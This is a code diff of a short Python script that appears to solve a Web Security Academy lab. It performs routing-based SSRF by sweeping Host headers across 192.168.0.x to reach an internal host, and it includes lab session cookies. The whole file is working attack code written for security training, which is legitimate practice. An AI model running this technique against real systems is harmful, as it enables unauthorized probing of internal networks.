@@ -1,21 +1,21 @@
 import requests
+import http.client
 
-url = 'https://ac5a1fe51eeb90ccc0114d4c006000b5.web-security-academy.net/'
+url = 'https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net/?https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net'
 
 def SSRF():
+    connection = http.client.HTTPSConnection("acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net")
+
     for i in range(0, 256):
-        response = requests.get(url, headers={
-            'Host': '192.168.0.' + str(i)
-        }, cookies={
-            '_lab': '46%7cMCwCFGmTfSzxpnbpO16ogRYsnhBEQww8AhQG%2f8wty6UeYqviKOkAa8Y6VnLy22emeniQvrpO5g2hcEbUVL%2fuLI%2f2asP0ONXXAqWem%2baMeNXjZAG40hb4vofigVRjI6EpB75lQjRJLY%2bU0s5f4D4vuDHOQ4YtQwLQV0nWGB5j7YVBvPM%3d'
-        }, params={
-            'https://ac5a1fe51eeb90ccc0114d4c006000b5.web-security-academy.net/': ''
-        }, allow_redirects=False)
+        connection.request("GET", "https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net/", headers={
+            'Host': '192.168.0.' + str(i),
+            'Cookie': '_lab=46%7cMCwCFB9hB4xwt69WL7ojJT2kCFcqJFONAhQUpa8Sh7BUDSjtWt%2bjm%2f04%2bA%2ffWIXSBq9atYlHwNHw92V6GjickKfNlKsQXBEhErtZActuwe4Oye%2bj69ITyYt%2fmgd5hugo7BpAkupzqwXFKVSseFSK%2fqnWEA735A1Y6pppBFpfOvJS9nM%3d'
+        })
+        response = connection.getresponse()
 
-        if response.status_code != 403:
+        if response.status != 504:
             print(i)
-            print(response.text)
-            print(response.status_code)
+            print(response.read().decode())
             break
-
+    
 SSRF()
